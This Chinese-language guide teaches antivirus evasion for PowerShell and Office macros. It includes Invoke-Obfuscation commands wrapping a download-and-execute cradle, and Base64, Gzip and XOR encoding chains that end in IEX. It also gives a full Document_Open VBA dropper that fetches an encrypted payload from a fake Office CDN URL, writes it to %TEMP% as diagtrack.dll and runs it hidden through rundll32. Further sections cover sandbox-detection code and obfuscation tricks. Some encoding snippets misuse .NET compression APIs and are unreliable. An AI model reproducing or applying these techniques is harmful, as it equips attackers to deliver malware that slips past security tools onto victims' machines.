## 一、PowerShell免杀深度指南

### 1.1 混淆层级

原始脚本 → 变量重命名 → 字符串编码 → Base64/Gzip → 分段加载 → 内存执行

### 1.2 Invoke-Obfuscation（PS混淆器）
```powershell

# TOKEN层混淆（拆分命令）
Invoke-Obfuscation -Command "IEX(New-Object Net.WebClient).DownloadString('http://server/a')" -Command TOKEN

# STRING层混淆（字符串编码+拼接）
Invoke-Obfuscation -Command $payload -Command STRING -Encoding 2

# COMPRESS层混淆（Gzip+Base64）
Invoke-Obfuscation -Command $payload -Command COMPRESS

# LAUNCHER（生成一行式启动器）
Invoke-Obfuscation -Command $payload -Command LAUNCHER
```

### 1.3 多层编码实战
```powershell
# Step 1: 文本混淆 + 变量拆分
$p1 = "I"; $p2 = "E"; $p3 = "X"
$var = "`$c=New-Object Net.WebClient;`$c.DownloadString('http://server/a')"
$cmd = "$p1$p2$p3($var)"

# Step 2: Base64 + 解压
$c = [Convert]::ToBase64String([IO.Compression.CompressionLevel]::Optimal, 
  [Text.Encoding]::Unicode.GetBytes($cmd))
# 执行端:
$s = [Text.Encoding]::Unicode.GetString([IO.Compression.CompressionLevel]::Decompress(
  [Convert]::FromBase64String($c)))

# Step 3: XOR + Base64
$key = 0x5A
$xor = [byte[]]($cmd.ToCharArray() | % { $_ -bxor $key })
$enc = [Convert]::ToBase64String($xor)
# 执行端:
$dec = [Convert]::FromBase64String($enc) | % { [char]($_ -bxor $key) }
$str = -join $dec; IEX $str
```

## 二、VBA/VBScript宏免杀

### 2.1 VBA多阶段加载
```vba
' Stage 1: Dropper (放在Excel/Word宏中)
Private Sub Document_Open()
    Dim key As Integer: key = 91
    Dim url As String: url = "https://cdn.office.com/update/theme.dat"
    
    ' 下载加密payload
    Set http = CreateObject("MSXML2.ServerXMLHTTP")
    http.Open "GET", url, False
    http.Send
    
    ' 解密
    Dim enc(): enc = http.ResponseBody
    Dim dec() As Byte: ReDim dec(UBound(enc))
    For i = 0 To UBound(enc)
        dec(i) = enc(i) Xor key
    Next
    
    ' 写入%TEMP%
    fPath = Environ("TEMP") & "\diagtrack.dll"
    Open fPath For Binary As #1
    Put #1, , dec
    Close #1
    
    ' 执行（使用rundll32或计划任务）
    Shell "rundll32.exe " & fPath & ",Start", vbHide
End Sub
```

### 2.3 VBA Sandbox检测
```vba
' 检测沙箱后再执行
Function IsSandbox() As Boolean
    ' 检测CPU核心数
    Set wmi = GetObject("winmgmts:\\.\root\cimv2")
    Set cpus = wmi.ExecQuery("SELECT NumberOfCores FROM Win32_Processor")
    For Each cpu In cpus
        If cpu.NumberOfCores < 2 Then IsSandbox = True: Exit Function
    Next
    
    ' 检测最近文档
    recent = Environ("USERPROFILE") & "\AppData\Roaming\Microsoft\Windows\Recent"
    Set fso = CreateObject("Scripting.FileSystemObject")
    If fso.GetFolder(recent).Files.Count < 5 Then IsSandbox = True
End Function
```

### 2.4 VBA反混淆技巧
- **变量名混淆**：用随机字母/数字组合替代语义变量名
- **字符串拆分**：`Chr(104)&Chr(116)&Chr(116)&Chr(112)` 代替 `"http"`
- **死代码插入**：大量无用变量赋值和条件分支
- **多层调用**：函数A→B→C→D链式调用最终payload
